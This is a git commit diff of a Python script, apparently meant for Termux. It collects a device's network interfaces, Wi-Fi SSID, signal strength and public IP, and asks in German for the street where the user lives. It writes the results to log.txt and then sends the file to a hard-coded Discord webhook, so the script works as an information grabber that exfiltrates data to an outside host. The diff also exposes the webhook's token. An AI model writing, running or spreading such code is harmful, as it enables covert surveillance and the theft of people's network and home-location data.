f8a6efe13d9530474e38195d04d1d1813bbda2fc
zino-tp <162809712+zino-tp@users.noreply.github.com>
2024-07-12 04:27:13 +0200

    Update and rename Pv.py to v.py

--- v.py
+++ v.py
@@ -2,6 +2,7 @@ import subprocess
 import requests
 import json
 import netifaces
+import getpass
 
 # Discord Webhook URL
 webhook_url = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA'
@@ -24,22 +25,22 @@ def execute_command(command):
 # Function to get detailed network information
 def get_network_info():
     interfaces = netifaces.interfaces()
-    wlan_info = None
+    network_info = {}
+
     for iface in interfaces:
-        if 'wlan' in iface:
-            addrs = netifaces.ifaddresses(iface)
-            if netifaces.AF_INET in addrs:
-                wlan_info = addrs[netifaces.AF_INET][0]
-                wlan_info['interface'] = iface
-                break
-    return wlan_info
+        addrs = netifaces.ifaddresses(iface)
+        if netifaces.AF_INET in addrs:
+            addresses = addrs[netifaces.AF_INET]
+            network_info[iface] = addresses
+    
+    return network_info
 
 # Function to get SSID and additional network details
 def get_wifi_details():
     ssid = execute_command('iwgetid -r')
     signal_strength = execute_command('iwconfig 2>&1 | grep Signal | cut -d "=" -f 3 | cut -d " " -f 1')
     # Placeholder for street name - not directly available via standard commands
-    street = ''  
+    street = input("Bitte geben Sie die Straße ein, wo Sie wohnen: ")  
 
     return {
         'ssid': ssid,
@@ -52,38 +53,31 @@ def get_public_ip():
     ip = execute_command('curl -s https://api64.ipify.org')
     return ip
 
-# Function to get detailed network information
-def get_detailed_network_info():
-    gateway = execute_command('ip route | grep default | awk \'/default/ {print $3}\'')
-    dns_servers = execute_command('cat /etc/resolv.conf | grep nameserver | awk \'{print $2}\'')
-    mac_address = execute_command('cat /sys/class/net/wlan0/address')
-
-    return {
-        'gateway': gateway,
-        'dns_servers': dns_servers,
-        'mac_address': mac_address,
-    }
+# Function to get user's home directory (for Termux)
+def get_home_directory():
+    home_dir = execute_command('termux-info home')
+    return home_dir
 
 # Collect detailed network and WiFi information
-wlan_info = get_network_info()
+network_info = get_network_info()
 wifi_details = get_wifi_details()
-network_info = get_detailed_network_info()
 public_ip = get_public_ip()
+user_street = getpass.getuser()  # Get the username as the street (placeholder)
 
 # Write collected information to log.txt
 with open('log.txt', 'w') as f:
-    f.write("=== WLAN Network Information ===\n")
-    f.write(f"Interface: {wlan_info['interface']}\n")
-    f.write(f"IP Address: {wlan_info['addr']}\n")
-    f.write(f"Netmask: {wlan_info['netmask']}\n")
-    f.write(f"Broadcast Address: {wlan_info['broadcast']}\n")
-    f.write(f"Gateway: {network_info['gateway']}\n")
-    f.write(f"DNS Servers: {network_info['dns_servers']}\n")
-    f.write(f"MAC Address: {network_info['mac_address']}\n")
+    f.write("=== Network Information ===\n")
+    for iface, addresses in network_info.items():
+        f.write(f"Interface: {iface}\n")
+        for addr in addresses:
+            f.write(f"IP Address: {addr['addr']}\n")
+            f.write(f"Netmask: {addr['netmask']}\n")
+            f.write(f"Broadcast Address: {addr['broadcast']}\n")
+        f.write("\n")
     f.write(f"SSID: {wifi_details['ssid']}\n")
     f.write(f"Signal Strength: {wifi_details['signal_strength']} dBm\n")
     f.write(f"Public IP Address: {public_ip}\n")
-    f.write(f"Street: {wifi_details['street']}\n\n")
+    f.write(f"Street: {user_street}\n\n")
 
 # Send log.txt content to Discord webhook
 with open('log.txt', 'r') as f:
